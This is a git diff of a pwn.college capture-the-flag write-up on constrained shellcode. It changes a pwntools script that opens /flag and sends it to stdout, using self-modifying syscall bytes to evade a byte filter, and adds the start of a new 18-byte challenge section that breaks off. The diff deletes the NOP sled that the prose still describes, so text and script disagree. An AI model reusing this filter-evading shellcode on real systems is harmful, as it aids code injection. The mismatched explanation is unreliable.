@@ -103,7 +103,7 @@ This challenge requires that your shellcode have no H bytes!
 Failed filter at byte 0!
 ```
 
-We can see that the program requires that our shell code has no `[REX.W prefix]`(https://en.wikipedia.org/wiki/REX_prefix).
+We can see that the program requires that our shell code has no [`REX.W prefix`](https://en.wikipedia.org/wiki/REX_prefix).
 
 ```
 ## REX:
@@ -469,7 +469,7 @@ Executing shellcode!
 Segmentation fault
 ```
 
-Since the first 4096 bytes will be non-executable, we will have to pad that range with a NOP sled.
+Since the first 4096 bytes will be non-writable, we will have to pad that range with a NOP sled.
 
 ### NOP sled
 
@@ -510,15 +510,6 @@ context.os = "linux"
 context.log_level = "error"
 
 shellcode_asm = """
-    /* NOP sled */
-    jmp Relative
-
-    .rept 4096
-    nop
-    .endr
-
-    Relative:
-
     /* open("/flag", 0, 0) */
     lea edi, [rip + flag]
     xor esi, esi
@@ -526,11 +517,11 @@ shellcode_asm = """
     mov eax, 0x02
     
     /* syscall */
- 	inc byte ptr [rip + sys1 + 1]
-	inc byte ptr [rip + sys1]
+    inc byte ptr [rip + sys1 + 1]
+    inc byte ptr [rip + sys1]
 sys1:
-	.byte 0x0e
-	.byte 0x04        
+    .byte 0x0e
+    .byte 0x04        
 
     /* sendfile(1, rax, 0, 0x100) */
     mov edi, 1          
@@ -540,22 +531,22 @@ sys1:
     mov eax, 40          
  
     /* syscall */
- 	inc byte ptr [rip + sys2 + 1]
-	inc byte ptr [rip + sys2]
+    inc byte ptr [rip + sys2 + 1]
+    inc byte ptr [rip + sys2]
 sys2:
-	.byte 0x0e
-	.byte 0x04            
+    .byte 0x0e
+    .byte 0x04            
 
     /* exit(0) */
     xor edi, edi
     mov al, 60
 
     /* syscall */
- 	inc byte ptr [rip + sys3 + 1]
-	inc byte ptr [rip + sys3]
+    inc byte ptr [rip + sys3 + 1]
+    inc byte ptr [rip + sys3]
 sys3:
-	.byte 0x0e
-	.byte 0x04           
+    .byte 0x0e
+    .byte 0x04           
 
 flag:
     .string "/flag" 
@@ -583,4 +574,29 @@ hacker@program-security~syscall-shenanigans:/$ python ~/script.py | /challenge/s
 Executing shellcode!
 
 pwn.college{ExWjiR3WDqi0KdvDkYToGHFiGhQ.0lMyIDL4ITM0EzW}
+```
+
+## Byte Budget
+
+> Write and execute shellcode to read the flag, but you only get 18 bytes.
+
+```
+hacker@program-security~byte-budget:/$ /challenge/byte-budget 
+###
+### Welcome to /challenge/byte-budget!
+###
+
+This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
+as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
+practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
+other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.
+
+Mapped 0x1000 bytes for shellcode at 0x2e0a9000!
+Reading 0x12 bytes from stdin.
+```
+
+This challenge limits our shell code to only 18 bytes.
+
+```
+
 ```
